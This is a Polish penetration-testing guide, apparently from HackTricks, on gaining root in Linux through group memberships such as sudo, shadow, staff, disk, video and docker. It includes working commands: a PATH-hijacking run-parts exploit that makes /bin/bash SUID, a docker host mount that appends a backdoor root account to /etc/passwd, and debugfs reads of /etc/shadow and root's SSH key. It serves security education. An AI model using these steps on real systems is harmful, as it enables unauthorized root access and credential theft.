# Interesujące grupy - Linux Privesc

## Grupy Sudo/Admin

### **PE - Method 1**

**Czasami** polityka **/etc/sudoers** systemu (lub plik dołączony z tego pliku) zawiera wpisy takie jak:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Oznacza to, że każdy użytkownik pasujący do któregokolwiek z tych wpisów może uruchomić dowolne polecenie jako dowolny użytkownik docelowy za pomocą `sudo` (z zastrzeżeniem pozostałych zasad).<sup>[[3]](#references)</sup>

Jeśli tak jest, aby **zostać rootem, wystarczy wykonać**:
```
sudo su
```
### PE - Method 2

Znajdź wszystkie pliki binarne suid i sprawdź, czy znajduje się wśród nich plik binarny **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Jeśli **pkexec jest binarnym plikiem SUID**, może wykonać program jako inny użytkownik tylko wtedy, gdy polkit autoryzuje żądaną akcję; sam bit SUID nie gwarantuje uprawnień root. Sprawdź zainstalowaną politykę oraz autoryzację sesji docelowej, zamiast zakładać, że członkostwo w grupie **sudo** lub **admin** jest wystarczające.<sup>[[4]](#references)[[5]](#references)</sup>

W dystrybucjach, które nadal używają starszego backendu Local Authority, sprawdź jego reguły grup za pomocą:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Odpowiednie nazwy grup i wartości domyślne różnią się w zależności od dystrybucji; grupa jest tutaj przydatna tylko wtedy, gdy wymienia ją lokalna polityka.<sup>[[5]](#references)</sup>

Aby **zostać rootem, możesz wykonać**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Jeśli spróbujesz wykonać **pkexec** i otrzymasz ten **błąd**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
W sesji SSH bez zarejestrowanego agenta uwierzytelniania `pkexec` może zakończyć się błędem, nawet jeśli zasady w innym przypadku zezwalałyby na wykonanie tej czynności; polkit opisuje `pkttyagent` jako tekstowego agenta uwierzytelniania dla sesji innych niż desktopowe. Dokładne działanie zależy od wersji i dystrybucji, dlatego należy sprawdzić lokalne zasady oraz konfigurację agenta. Jedno z obejść zgłoszonych dla niektórych wersji NixOS wykorzystuje **2 różne sesje SSH**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupa wheel

Czasami polityka sudoers może również zawierać ten wpis:
```
%wheel	ALL=(ALL:ALL) ALL
```
Oznacza to, że każdy użytkownik pasujący do tego wpisu może uruchomić dowolne polecenie jako dowolny użytkownik docelowy za pośrednictwem `sudo` (z zastrzeżeniem pozostałej części polityki).<sup>[[3]](#references)</sup>

Jeśli tak jest, aby **zostać rootem, możesz po prostu wykonać**:
```
sudo su
```
## Grupa shadow

W systemach, w których uprawnienia na to pozwalają, użytkownicy należący do grupy **shadow** mogą **odczytywać** **/etc/shadow**; sprawdź rzeczywisty tryb uprawnień i listy ACL na celu:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Zatem przeczytaj plik i spróbuj **scrackować kilka hashy**.

Krótka uwaga dotycząca stanu blokady podczas analizy hashy:
- Wpisy zawierające `!` lub `*` są zasadniczo nieinteraktywne w przypadku logowania za pomocą hasła.
- `!hash` oznacza, że hasło zostało zablokowane; pozostałe znaki reprezentują pole hasła sprzed jego zablokowania.
- Pole zawierające `*` nie jest prawidłowym hashem `crypt(3)` i uniemożliwia logowanie za pomocą hasła UNIX; nie należy na tej podstawie wnioskować, czy hasło było wcześniej ustawione.
Jest to przydatne przy klasyfikowaniu kont, nawet gdy bezpośrednie logowanie jest zablokowane.<sup>[[6]](#references)</sup>

## Grupa Staff

**staff**: Umożliwia użytkownikom dodawanie lokalnych modyfikacji do systemu (`/usr/local`) bez konieczności posiadania uprawnień root (należy pamiętać, że pliki wykonywalne w `/usr/local/bin` znajdują się w zmiennej PATH każdego użytkownika i mogą „przesłaniać” pliki wykonywalne w `/bin` i `/usr/bin` o tej samej nazwie). Dla porównania, grupa „adm” jest bardziej związana z monitorowaniem i bezpieczeństwem.<sup>[[2]](#references)[[7]](#references)</sup>

W konfiguracjach Debiana, w których `/usr/local/bin` występuje przed `/usr/bin` w `PATH` (jak w poniższych przykładach), niekwalifikowane polecenie najpierw wskazuje kopię z `/usr/local/bin`; potwierdź rzeczywistą wartość `PATH` na celu.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Jeśli uprzywilejowany proces rozwiązuje niekwalifikowaną komendę za pośrednictwem zapisywalnego `/usr/local/bin`, zastąpienie tej komendy może spowodować jej wykonanie z uprawnieniami procesu; przed testowaniem potwierdź rzeczywistą ścieżkę i wyzwalacz.

W systemach Ubuntu `pam_motd` uruchamia skrypty wykonywalne za pośrednictwem `run-parts --lsbsysinit` jako root podczas logowania; zadania cron również mogą używać `run-parts`, ale zależy to od dystrybucji i konfiguracji.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Przy nowym logowaniu SSH `pspy` może pomóc potwierdzić, czy ta ścieżka jest faktycznie wywoływana na celu; może obserwować wiersze poleceń procesów bez uprawnień root.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Grupa disk

Członkostwo w grupie **disk** może zapewniać surowy dostęp do urządzeń blokowych i często jest **zbliżone do root access**; Debian opisuje je jako w większości równoważne uprawnieniom root, ale należy zweryfikować rzeczywiste uprawnienia urządzeń oraz układ pamięci masowej na celu.<sup>[[7]](#references)</sup>

Typowe ścieżki urządzeń obejmują `/dev/sd*`, ale NVMe i inne układy pamięci masowej używają innych nazw.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` działa na systemach plików ext2/ext3/ext4; ścieżki takie jak `/root` i `/etc/shadow` powyżej to pliki wewnątrz otwartego systemu plików, natomiast drugi argument polecenia `dump` to ścieżka wyjściowa w natywnym systemie plików.<sup>[[8]](#references)</sup> Na przykład wyodrębnia to `/tmp/asd1.txt` z otwartego systemu plików do `/tmp/asd2.txt` w natywnym systemie plików:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Opcja `-w` otwiera system plików w trybie odczytu i zapisu, a polecenie `write` kopiuje natywny plik do otwartego systemu plików. Unikaj używania jej na zamontowanym aktywnym systemie plików, ponieważ bezpośrednie edycje mogą uszkodzić system plików; w miarę możliwości pracuj z obrazem offline.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Grupa video

Za pomocą polecenia `w` możesz sprawdzić **kto jest zalogowany do systemu**, a wyświetlone zostaną dane podobne do poniższych.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Wpis **tty1** identyfikuje pierwszą wirtualną konsolę Linux; sam w sobie nie dowodzi, że użytkownik fizycznie znajduje się przy komputerze, szczególnie w kontenerach lub innych środowiskach.<sup>[[21]](#references)</sup>

W systemach udostępniających urządzenie framebuffer z uprawnieniami odczytu członkostwo w grupie **video** może zapewniać dostęp do tego urządzenia. Interfejs Linux framebuffer dokumentuje `/dev/fb0` jako urządzenie pamięci z uprawnieniami odczytu, które można skopiować w celu wykonania zrzutu ekranu; ścieżka `/sys/class/graphics/fb0/virtual_size` jest dostępna tylko tam, gdzie obecny jest ten atrybut sysfs fbdev, dlatego najpierw sprawdź system docelowy.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Jeśli zainstalowana wersja **GIMP** udostępnia importer danych surowych, otwórz plik **`screen.raw`** za jego pomocą; obsługiwane formaty i elementy sterujące różnią się w zależności od wersji i plug-inu.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Aby otworzyć surowy obraz, możesz użyć GIMP, wybrać plik screen.raw i jako typ pliku wybrać Raw image data](<../../../images/image (463).png>)

Ustaw szerokość i wysokość obrazu tak, aby odpowiadały geometrii framebuffer; wypróbuj dostępne formaty pikseli/typy obrazu, aż wynik będzie czytelny.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Następnie zmień szerokość i wysokość na wartości używane na ekranie oraz sprawdź różne typy obrazu (i wybierz ten, który najlepiej odwzorowuje ekran)](<../../../images/image (317).png>)

## Grupa root

Przynależność do grupy **root** nie zapewnia UID użytkownika root, ale pliki zapisywalne przez grupę, których właścicielem jest `root`, mogą być interesujące, gdy korzystają z nich uprzywilejowane usługi lub biblioteki. Przed potraktowaniem tego jako ścieżki do privilege-escalation zweryfikuj rzeczywiste uprawnienia pliku i sposób jego użycia.

**Sprawdź, które pliki mogą modyfikować członkowie grupy root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupa Docker

Członkostwo w grupie `docker` zapewnia dostęp na poziomie roota do daemonu Docker podczas standardowych instalacji rootful. Ponieważ bind mounts są domyślnie dostępne do odczytu i zapisu, użytkownik, który może kontrolować ten daemon, może zamontować główny katalog hosta `/` w kontenerze i modyfikować pliki hosta; w praktyce zapewnia to uprawnienia roota na hoście.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Na koniec, jeśli nie podobają Ci się żadne z wcześniejszych sugestii lub z jakiegoś powodu nie działają (firewall docker api?), zawsze możesz spróbować **uruchomić privileged container i escape z niego**, jak wyjaśniono tutaj:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Jeśli masz uprawnienia do zapisu w docker socket, przeczytaj [**ten post o tym, jak eskalować uprawnienia poprzez nadużycie docker socket**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Grupa lxc/lxd

{{#ref}}
./
{{#endref}}

## Grupa adm

Zwykle **członkowie** grupy **`adm`** mają uprawnienia do **odczytu plików logów** znajdujących się w _/var/log/_.\
Dlatego jeśli przejąłeś użytkownika należącego do tej grupy, zdecydowanie powinieneś **sprawdzić logi**.<sup>[[7]](#references)</sup>

## Grupy Backup / Operator / lp / Mail

Grupy te mają znaczenie zależne od usług i dystrybucji. Debian opisuje `backup` jako grupę do delegowanego tworzenia kopii zapasowych i przywracania, `lp` jako grupę dla printer daemons, a `mail` jako grupę dla `/var/mail`, dlatego przed potraktowaniem członkostwa jako ścieżki do uzyskania uprawnień sprawdź lokalne uprawnienia.<sup>[[7]](#references)</sup>

Często są one wektorami **credential-discovery**, a nie bezpośrednimi wektorami prowadzącymi do root:
- **backup**: może ujawniać archiwa zawierające konfiguracje, klucze, zrzuty baz danych lub tokeny.
- **operator**: zależny od platformy dostęp operacyjny, który może leakować wrażliwe dane runtime.
- **lp**: kolejki i spool'e wydruku mogą zawierać treść dokumentów.
- **mail**: spools pocztowe mogą ujawniać linki resetujące, OTP oraz wewnętrzne dane uwierzytelniające.

Traktuj członkostwo w tych grupach jako finding o wysokiej wartości związany z ujawnieniem danych i wykonuj pivot poprzez ponowne użycie haseł lub tokenów.

## Grupa Auth

W OpenBSD, gdy skonfigurowano S/Key, `/etc/skey` należy do `root:auth`, a dostęp do jego rekordów wymaga grupy `auth`; rekordy YubiKey są przechowywane w `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Podatna konfiguracja OpenBSD 6.6 z włączonym S/Key lub YubiKey pozwalała lokalnym użytkownikom z uprawnieniami `auth` uzyskać root; Qualys opisuje wymagania wstępne i łańcuch exploit, a podany PoC go implementuje.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Uwierzytelnianie pkexec/pkttyagent bez sesji GUI (zgłoszenie NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Podręcznik zabezpieczania Debiana](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Urządzenie Frame Buffer — dokumentacja Linux Kernel](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — nieuprzywilejowane monitorowanie procesów Linux](https://github.com/DominicBreuker/pspy)
- [13] [Bezpieczeństwo Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Zarządzanie Dockerem jako użytkownik non-root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Uruchamianie kontenerów — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Podatności uwierzytelniania w OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Przydzielone urządzenia Linux (wersja 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importowanie i eksportowanie obrazów — dokumentacja GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
